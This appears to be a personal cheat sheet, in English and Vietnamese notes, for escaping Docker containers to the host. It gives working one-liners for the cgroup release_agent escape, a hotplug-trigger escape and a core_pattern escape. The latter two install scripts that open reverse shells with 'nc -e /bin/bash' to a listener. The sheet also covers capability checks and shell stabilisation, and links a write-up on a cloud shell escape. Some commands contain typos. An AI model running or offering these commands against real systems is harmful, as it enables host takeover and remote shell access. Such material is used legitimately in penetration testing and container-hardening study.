# Container Escape

```
systemd-detech-virtdocker
cat /proc/1/cgroup

ps -p 1 (of CMD -> bash may be container)

-> check
cat /proc/self/status | grep CapEff
CapEff:123

capsh --decode=123


(cat /proc/cmdline | grep 'module.sig_enforce")

nếu = 1 -> cần chữ ký để upload

* Thử
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o


* Thử    
Create payload escape

Step 1:  hostname -I OR ip a show dev eth0
Get ip 127.0.0.2


#!/bin/sh
nc -e /bin/bash 127.0.0.2 25253

cat > /shell


chmod +x /shell


ở tab khác

thực hiện nc -lvnp 25253

Tìm đường dẫn tuyệt đối

mount | head -n 1 | grep upperdir

echo "upperdir/shell" | sudo tee /proc/sys/kernet/hotplug > dev/null

tạo trình kích hoạt hotplug

ip link add test0 type dummy || ip link add test0 type tun    # tùy thuộc vào trình điều khiển có sẵn
 ip link delete test0

python3 -c 'import pty, os; pty.spawn("/bin/bash")'
export TERM=xterm-256color



oneline

echo $ '#!/bin/sh\nnc -c /bin/bash ' $(hostname -I|awk '{print $1}' ) ' 9001' | tee /shell > /dev/null && chmod +x /shell; echo  " $(mount|grep upper|sed -E 's/.*upperdir=([^,]+) .*/\1/')/shell" | tee /proc/sys/kernel/hotplug > /dev/null; ip link add test0 type dummy && ip link delete test0



2

echo '|/usr/bin/nc -e /bin/sh <CONTAINER_IP> <PORT>' | sudo tee /proc/sys/kernel/core_pattern >/dev/null



sleep 9999 & 
echo $! > /tmp/sleep.pid 
kill -SIGABRT $( cat /tmp/sleep.pid)

OR
gcc -xc -o /tmp/a - <<< 'int main(){volatile int *p=0;*p=1;}' && /tmp/a


ở tab khác vẫn thực thi

nv -lvnp port

one line

echo  "|/usr/bin/nc -e /bin/bash $(hostname -I|awk '{print $1}') 9001" | tee /proc/sys/kernel/core_pattern > /dev/null; ( sleep 60 & kill -SIGABRT $!)



```

[https://medium.com/@win3zz/google-cloud-shell-container-escape-b69ffb46b5df](https://medium.com/@win3zz/google-cloud-shell-container-escape-b69ffb46b5df)
